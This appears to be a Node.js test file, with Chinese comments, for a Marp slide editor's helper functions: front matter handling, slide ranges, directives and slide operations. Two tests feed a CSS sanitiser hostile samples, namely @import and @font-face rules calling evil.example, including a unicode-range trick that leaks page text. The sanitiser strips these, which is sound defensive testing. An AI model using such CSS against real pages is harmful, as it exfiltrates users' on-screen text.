// 執行：node --test src/slides.test.js
import { test } from "node:test";
import assert from "node:assert/strict";
import { Marp } from "@marp-team/marp-core";
import {
  isSlides,
  stripFrontMatter,
  stripImports,
  SLIDES_TEMPLATE,
  slideRanges,
  readFrontMatter,
  setGlobal,
  setSpot,
  setSpotDirective,
  toggleClass,
  addSlide,
  duplicateSlide,
  deleteSlide,
} from "./slides.js";

const marp = new Marp({ script: false });
const FM = "---\nmarp: true\n---\n";
const slides = (md) => slideRanges(marp, md).slides;
// 每頁的原文（不含分隔線），比較搬移結果用
const bodies = (md) => {
  const lines = md.split("\n");
  return slides(md).map((s) => lines.slice(s.separator ? s.start + 1 : s.start, s.end).join("\n").trim());
};

test("只有 front matter 寫 marp: true 才是簡報", () => {
  assert.equal(isSlides("---\nmarp: true\n---\n# A"), true);
  assert.equal(isSlides("---\ntheme: gaia\nmarp: true\n---"), true);
  assert.equal(isSlides(SLIDES_TEMPLATE), true);
  assert.equal(isSlides("---\nmarp: false\n---"), false);
  assert.equal(isSlides("# A\n---\nmarp: true\n---"), false); // 不在開頭
  assert.equal(isSlides("# 一般文件\n\n---\n\n分隔線"), false);
});

test("去掉 front matter", () => {
  assert.equal(stripFrontMatter("---\nmarp: true\n---\n# A"), "# A");
  assert.equal(stripFrontMatter("# A\n---\nb\n---"), "# A\n---\nb\n---");
});

test("拿掉外部 @import，保留主題字型", () => {
  const font = '@import "https://fonts.bunny.net/css?family=Lato";';
  assert.equal(
    stripImports(`${font}@import url("https://evil.example/x.css");@import 'https://evil.example/y.css';div{}`),
    `${font}  div{}`,
  );
});

test("拿掉 @font-face：unicode-range 可以逐字偷讀頁面上的文字", () => {
  const css = stripImports(
    "@font-face{font-family:Menlo;src:url(https://evil.example/?c=61);unicode-range:U+61}" +
      "@FONT-FACE {src:url(https://evil.example/b)}" +
      "@font@font-face{}-face{src:url(https://evil.example/c)}div{}",
  );
  assert.doesNotMatch(css, /@font-face/i);
  assert.match(css, /div\{\}$/);
});

test("拿掉 @property：會蓋掉 Tailwind 註冊的 --tw-* 變數", () => {
  const css = stripImports(
    '@property --tw-border-style{syntax:"*";inherits:false;initial-value:none}' +
      "@PROPERTY --tw-x {initial-value:1px}div{}",
  );
  assert.doesNotMatch(css, /@property/i);
  assert.match(css, /div\{\}$/);
});

test("分頁範圍：程式碼區塊裡的 --- 不算，*** 也能分頁，第 1 頁從 front matter 後面開始", () => {
  const md = `${FM}\n# 1\n\n\`\`\`\n---\n\`\`\`\n\n***\n\n# 2\n`;
  const [a, b] = slides(md);
  assert.equal(slides(md).length, 2);
  assert.deepEqual([a.start, a.end, a.separator], [3, 10, false]);
  assert.deepEqual([b.start, b.end, b.separator], [10, 14, true]);
  assert.deepEqual(bodies(md), ["# 1\n\n```\n---\n```", "# 2"]);
});

test("分頁範圍：front matter 格式錯誤時不會丟錯", () => {
  assert.doesNotThrow(() => slideRanges(marp, "---\nmarp: true\nfoo: [\n---\n# a"));
});

test("分頁範圍：有參考連結、註腳時照樣算得出來", () => {
  assert.equal(slides(`${FM}\n# 1 [x][r]\n\n[r]: http://e.com\n\n---\n\n# 2`).length, 2);
});

test("分頁範圍：front matter 結尾的 --- 後面有空白", () => {
  const md = "---\nmarp: true\n--- \n\n# 1\n\n---\n\n# 2";
  assert.deepEqual(slides(md).map((s) => [s.start, s.end]), [[3, 6], [6, 9]]);
});

test("整份設定：改 front matter 那一行，其他行不變", () => {
  const md = "---\nmarp: true\ntheme: gaia\n# 註解\n---\n\n# A";
  assert.equal(setGlobal(md, "theme", "uncover"), "---\nmarp: true\ntheme: uncover\n# 註解\n---\n\n# A");
});

test("整份設定：沒有就加在 front matter 最後面，4:3 不加引號", () => {
  assert.equal(setGlobal(`${FM}\n# A`, "size", "4:3"), "---\nmarp: true\nsize: 4:3\n---\n\n# A");
});

test("整份設定：theme 寫在註解裡就改最後一個註解", () => {
  const md = `${FM}\n<!-- theme: gaia -->\n# A\n\n---\n\n<!-- theme: uncover -->\n# B`;
  const out = setGlobal(md, "theme", "default");
  assert.equal(out, `${FM}\n<!-- theme: gaia -->\n# A\n\n---\n\n<!-- theme: default -->\n# B`);
  assert.equal(slideRanges(marp, out).global.theme, "default");
});

test("整份設定：頁碼只改 front matter，不動中途的註解", () => {
  const md = "---\nmarp: true\npaginate: true\n---\n\n# 1\n\n---\n\n<!-- paginate: false -->\n# 2";
  assert.equal(
    setGlobal(md, "paginate", false),
    "---\nmarp: true\npaginate: false\n---\n\n# 1\n\n---\n\n<!-- paginate: false -->\n# 2",
  );
  const comment = `${FM}\n# 1\n\n---\n\n<!-- paginate: true -->\n# 2`;
  assert.equal(readFrontMatter(comment, "paginate"), undefined);
  assert.equal(setGlobal(comment, "paginate", true), `---\nmarp: true\npaginate: true\n---\n\n# 1\n\n---\n\n<!-- paginate: true -->\n# 2`);
});

test("整份設定：頁首跟頁尾一樣加在 front matter 最後面", () => {
  assert.equal(setGlobal(`${FM}# A`, "header", "第一章"), "---\nmarp: true\nheader: 第一章\n---\n# A");
});

test("整份設定：頁尾有冒號要加引號，讀回來是原本的字", () => {
  const out = setGlobal(`${FM}\n# A`, "footer", "公司: 研發部");
  assert.match(out, /^footer: "公司: 研發部"$/m);
  assert.equal(readFrontMatter(out, "footer"), "公司: 研發部");
  assert.match(marp.render(out).html, /公司: 研發部/);
});

test("整份設定：頁尾有反斜線要加引號，不然整個 front matter 解析失敗", () => {
  const out = setGlobal("---\nmarp: true\ntheme: gaia\n---\n\n# A", "footer", "C:\\Users\\me");
  assert.equal(readFrontMatter(out, "footer"), "C:\\Users\\me");
  assert.equal(slideRanges(marp, out).global.theme, "gaia");
});

test("整份設定：清空就刪掉那一行", () => {
  assert.equal(setGlobal("---\nmarp: true\nfooter: 公司名稱\n---\n# A", "footer", ""), "---\nmarp: true\n---\n# A");
  assert.equal(setGlobal(`${FM}# A`, "footer", ""), `${FM}# A`);
});

test("單頁設定：插在分隔線下一行，第 1 頁插在 front matter 後面", () => {
  const md = `${FM}\n# 1\n\n---\n\n# 2`;
  const [a, b] = slides(md);
  assert.equal(setSpot(md, b, "class", "lead"), `${FM}\n# 1\n\n---\n<!-- _class: lead -->\n\n# 2`);
  assert.equal(setSpot(md, a, "class", "lead"), `${FM}<!-- _class: lead -->\n\n# 1\n\n---\n\n# 2`);
});

test("置中、深色開關：同時開、保留其他 class、關掉最後一個就刪掉那一行", () => {
  const page = (cls) => `${FM}\n# 1\n\n---\n\n${cls}# 2`;
  assert.equal(toggleClass(marp, page(""), 1, "lead"), `${FM}\n# 1\n\n---\n<!-- _class: lead -->\n\n# 2`);
  assert.equal(toggleClass(marp, page("<!-- _class: lead -->\n"), 1, "invert"), page("<!-- _class: lead invert -->\n"));
  assert.equal(toggleClass(marp, page("<!-- _class: lead custom -->\n"), 1, "lead"), page("<!-- _class: custom -->\n"));
  assert.equal(toggleClass(marp, page("<!-- _class: invert -->\n"), 1, "invert"), page(""));
});

test("置中、深色開關：延續下來的 class: invert 要一起算", () => {
  const md = "---\nmarp: true\nclass: invert\n---\n\n# 1\n\n---\n\n# 2";
  const lead = toggleClass(marp, md, 1, "lead");
  assert.match(lead, /<!-- _class: invert lead -->/);
  assert.equal(slides(lead)[1].directives.class, "invert lead");
  const light = toggleClass(marp, md, 1, "invert");
  assert.match(light, /<!-- _class: "" -->/);
  assert.equal(slides(light)[1].directives.class, "");
  assert.equal(slides(light)[0].directives.class, "invert"); // 其他頁不受影響
  assert.equal(toggleClass(marp, light, 1, "invert"), md); // 再按一次回到原樣
});

test("隱藏頁碼：只影響這一頁；跟延續下來的一樣就不寫", () => {
  const md = "---\nmarp: true\npaginate: true\n---\n\n# 1\n\n---\n\n# 2\n\n---\n\n# 3";
  const hidden = setSpotDirective(marp, md, 1, "paginate", false);
  assert.match(hidden, /---\n<!-- _paginate: false -->\n\n# 2/);
  assert.deepEqual(slides(hidden).map((s) => s.directives.paginate), [true, false, true]);
  assert.equal(setSpotDirective(marp, hidden, 1, "paginate", true), md);
  assert.equal(setSpotDirective(marp, `${FM}\n# 1`, 0, "paginate", false), `${FM}\n# 1`);
});

test("隱藏頁碼：延續下來的 paginate: hold 也算有顯示", () => {
  const md = `${FM}\n# 1\n\n---\n\n<!-- paginate: hold -->\n# 2\n\n---\n\n# 3`;
  const hidden = setSpotDirective(marp, md, 2, "paginate", false);
  assert.deepEqual(slides(hidden).map((s) => s.directives.paginate), [undefined, "hold", false]);
  assert.equal(setSpotDirective(marp, hidden, 2, "paginate", true), md);
});

test("新增投影片：插在這頁後面；最後一行有字也不會變成標題底線", () => {
  const md = `${FM}\n# 1\n\n---\n\n# 2\n\n---\n\n# 3`;
  assert.deepEqual(bodies(addSlide(md, slides(md)[1])), ["# 1", "# 2", "", "# 3"]);
  assert.deepEqual(bodies(addSlide(md, slides(md)[2])), ["# 1", "# 2", "# 3", ""]);
  const text = `${FM}\n文字`;
  assert.deepEqual(bodies(addSlide(text, slides(text)[0])), ["文字", ""]);
});

test("複製投影片：程式碼裡的 --- 不會切開；第 1 頁補分隔線，front matter 只有一份", () => {
  const md = `${FM}\n# 1\n\n\`\`\`\n---\n\`\`\`\n\n---\n\n# 2\n`;
  const out = duplicateSlide(md, slides(md)[0]);
  assert.deepEqual(bodies(out), ["# 1\n\n```\n---\n```", "# 1\n\n```\n---\n```", "# 2"]);
  assert.equal(out.match(/marp: true/g).length, 1);
  assert.deepEqual(bodies(duplicateSlide(md, slides(md)[1])), ["# 1\n\n```\n---\n```", "# 2", "# 2"]);
});

test("刪除投影片：刪第 1 頁保留 front matter；只剩一頁不能刪", () => {
  const md = `---\nmarp: true\ntheme: gaia\n---\n\n# 1\n\n---\n\n# 2\n\n---\n\n# 3\n`;
  const first = deleteSlide(md, slides(md), 0);
  assert.equal(first, `---\nmarp: true\ntheme: gaia\n---\n\n# 2\n\n---\n\n# 3\n`);
  assert.deepEqual(bodies(deleteSlide(md, slides(md), 1)), ["# 1", "# 3"]);
  assert.deepEqual(bodies(deleteSlide(md, slides(md), 2)), ["# 1", "# 2"]);
  const one = `${FM}\n# 1`;
  assert.equal(deleteSlide(one, slides(one), 0), one);
  const styled = `${FM}\n<!-- style: section{color:red} -->\n# 1\n\n---\n\n# 2`;
  const out = deleteSlide(styled, slides(styled), 0);
  assert.equal(slideRanges(marp, out).global.style, "section{color:red}");
});

test("headingDivider：在 global 裡，工具列用它決定要不要隱藏投影片操作", () => {
  const md = "---\nmarp: true\nheadingDivider: 2\n---\n\n## a\n\n## b";
  assert.equal(slideRanges(marp, md).global.headingDivider, 2);
  assert.equal(slides(md).length, 2);
});

test("刪除投影片：這頁的 theme 註解留下來，延續的 class 一起刪", () => {
  const md = `${FM}\n<!-- theme: gaia -->\n<!-- class: invert -->\n# 1\n\n---\n\n# 2`;
  const next = deleteSlide(md, slides(md), 0);
  assert.equal(next, `${FM}<!-- theme: gaia -->\n\n# 2`);
  assert.equal(slideRanges(marp, next).global.theme, "gaia");
});

test("刪除投影片：整份的 <style> 區塊留下來，scoped 的一起刪", () => {
  const md = `${FM}\n<style>\nsection{color:red}\n</style>\n<style scoped>\nh1{color:blue}\n</style>\n# 1\n\n---\n\n# 2`;
  assert.equal(deleteSlide(md, slides(md), 0), `${FM}<style>\nsection{color:red}\n</style>\n\n# 2`);
});

test("刪除投影片：程式碼區塊裡的 <style>、設定註解是範例，一起刪", () => {
  const md = `${FM}\n\`\`\`html\n<style>section{background:red}</style>\n<!-- theme: uncover -->\n\`\`\`\n# 1\n\n---\n\n# 2`;
  assert.equal(deleteSlide(md, slides(md), 0), `${FM}\n# 2`);
});

test("一行有兩個註解：不整行換掉，改了不會生效就不改", () => {
  const md = `${FM}\n# 1\n\n---\n\n<!-- _class: lead --> <!-- _paginate: false -->\n# 2`;
  assert.equal(toggleClass(marp, md, 1, "invert"), md);
});

test("單頁設定寫在多行註解裡：改了不會生效就不改", () => {
  const md = `${FM}\n# 1\n\n---\n\n<!--\n_class: lead\n-->\n# 2`;
  assert.equal(toggleClass(marp, md, 1, "lead"), md);
});

test("隱藏頁碼：hold 算顯示，關掉時改成 false", () => {
  const md = `---\nmarp: true\npaginate: true\n---\n\n# 1\n\n---\n\n<!-- _paginate: hold -->\n# 2`;
  const next = setSpotDirective(marp, md, 1, "paginate", false);
  assert.equal(slides(next)[1].directives.paginate, false);
  assert.ok(!next.includes("hold"));
});

test("front matter 的值照原文讀，大小寫交給呼叫端", () => {
  assert.equal(readFrontMatter("---\nmarp: true\npaginate: True\n---\n", "paginate"), "True");
});
